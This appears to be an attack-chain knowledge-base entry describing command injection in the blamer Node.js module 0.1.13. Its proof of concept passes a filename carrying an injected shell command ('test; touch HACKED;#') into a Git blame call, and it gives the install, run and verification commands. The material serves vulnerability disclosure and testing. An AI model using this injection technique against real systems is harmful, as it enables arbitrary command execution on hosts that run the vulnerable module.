---
tags:
  - rce
  - command-injection
  - node.js
  - git
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/blamer]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Blamer-RCE-Proof-of-Concept]]'
  - '[[procedures/Verify-Clean-Environment-Before-Exploitation]]'
  - '[[procedures/Install-and-Execute-Blamer-RCE-PoC]]'
  - '[[procedures/Verify-RCE-Exploitation-Success]]'
step_count: 4
techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:23:24.819Z'
description: >-
  Multi-stage attack exploiting a command injection vulnerability in the blamer
  Node.js module to achieve remote code execution on the host system.
skill_level: intermediate
impact_level: high
id: baaf003c-41ab-4c1c-9c1e-c6e6e15c12c1
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploitation for Client Execution]]'
---
# RCE in Blamer Node.js Module via Git Command Injection

Multi-stage attack chain demonstrating exploitation of a remote code execution vulnerability in the blamer Node.js module version 0.1.13, where user input is unsafely interpolated into Git shell commands, allowing arbitrary command injection.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare PoC] --> B[Verify Environment]
    B --> C[Install and Execute]
    C --> D[Verify RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/blamer]]

### Target Environment

- Node.js runtime environment
- Git installed on the host system
- Unix-like shell (e.g., Linux or macOS)

### Initial Access Requirements

- Local access to a Node.js development environment
- No network access required; exploitation occurs locally via module usage

## Detailed Attack Procedures

### Step 1: Prepare Proof of Concept
procedure: [[procedures/Create-Blamer-RCE-Proof-of-Concept]]

**Objective**: Develop a JavaScript script that initializes the vulnerable blamer module and invokes the blameByFile method with malicious input to inject shell commands.

**Instructions**: Create a file named `poc.js` with the following content:

```javascript
const Blamer = require('blamer');
const blamer = new Blamer('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');
```

This script requires the blamer module, creates an instance for Git VCS, and calls the vulnerable method with a filename that includes semicolon-separated commands (`touch HACKED`) terminated by a comment (`#`).

**Expected Output**: No immediate output; the script prepares for execution.

**Success Indicators**:
- `poc.js` file created successfully
- Script syntax validated without errors

### Step 2: Verify Clean Environment
procedure: [[procedures/Verify-Clean-Environment-Before-Exploitation]]

**Objective**: Ensure the target directory has no pre-existing 'HACKED' file to confirm exploitation results.

**Instructions**: Manually inspect the current directory using filesystem commands like `ls` to check for the absence of 'HACKED'.

```bash
ls -la | grep HACKED
```

**Expected Output**: No output or file not found.

**Success Indicators**:
- No 'HACKED' file present
- Clean working directory confirmed

### Step 3: Install and Execute PoC
procedure: [[procedures/Install-and-Execute-Blamer-RCE-PoC]]

**Objective**: Install the vulnerable module and run the PoC to trigger command injection via the Git blame operation.

**Instructions**: First, install the blamer module using [[commands/npm-install-blamer]]:

```bash
npm i blamer@0.1.13
```

Then execute the PoC with [[commands/node-execute-poc]]:

```bash
node poc.js
```

This installs version 0.1.13 and runs the script, causing the module to format the malicious filename into a Git command like `git blame test; touch HACKED;#`, executing the injected command.

**Expected Output**: Node.js runs without errors; underlying shell command executes silently.

**Success Indicators**:
- Module installed in node_modules
- PoC script completes execution

### Step 4: Verify Exploitation
procedure: [[procedures/Verify-RCE-Exploitation-Success]]

**Objective**: Confirm arbitrary code execution by checking for the created 'HACKED' file.

**Instructions**: Re-inspect the directory for the 'HACKED' file using `ls`.

```bash
ls -la | grep HACKED
```

**Expected Output**: 'HACKED' file listed in the directory.

**Success Indicators**:
- 'HACKED' file exists and is empty
- Proof of successful command injection

## Attack Chain Summary

### Key Achievements

1. Successful creation and preparation of a PoC exploiting command injection in blamer.
2. Clean environment verification to isolate exploitation effects.
3. Installation and execution leading to arbitrary shell command run.
4. Validation confirming RCE capability, potentially enabling full system compromise.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unix Shell]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
